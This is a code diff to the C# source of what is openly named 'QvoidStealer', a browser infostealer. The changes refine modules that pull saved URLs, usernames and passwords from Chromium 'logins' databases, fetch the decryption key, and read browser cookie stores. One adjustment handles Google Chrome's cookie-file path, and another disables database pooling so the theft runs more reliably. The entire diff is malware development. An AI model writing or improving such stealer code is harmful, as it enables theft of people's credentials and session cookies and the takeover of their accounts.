@@ -1,4 +1,4 @@
-﻿using Newtonsoft.Json;
+using Newtonsoft.Json;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Modes;
 using Org.BouncyCastle.Crypto.Parameters;
@@ -88,7 +88,7 @@ namespace QvoidStealer.Miscellaneous.Stealers.Browsers
 
                 if (File.Exists(KeyPath) && File.Exists(p))
                 {
-                    using (var conn = new SQLiteConnection($"Data Source={p};"))
+                    using (var conn = new SQLiteConnection($"Data Source={p};pooling=false"))
                     {
                         conn.Open();
                         using (var cmd = conn.CreateCommand())
@@ -96,7 +96,6 @@ namespace QvoidStealer.Miscellaneous.Stealers.Browsers
                             cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                             using (var reader = cmd.ExecuteReader())
                             {
-
                                 if (reader.HasRows)
                                 {
                                     var key = ChromiumDecryptor.GetKey(KeyPath);
@@ -165,7 +164,12 @@ namespace QvoidStealer.Miscellaneous.Stealers.Browsers
             try
             {
                 List<CookieModel> cookies = new List<CookieModel>();
-                if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
+                if (CookiePath.Contains("\\Google\\Chrome\\"))
+                {
+                    if (!File.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException 
+                }
+                else
+                    if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
 
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={CookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
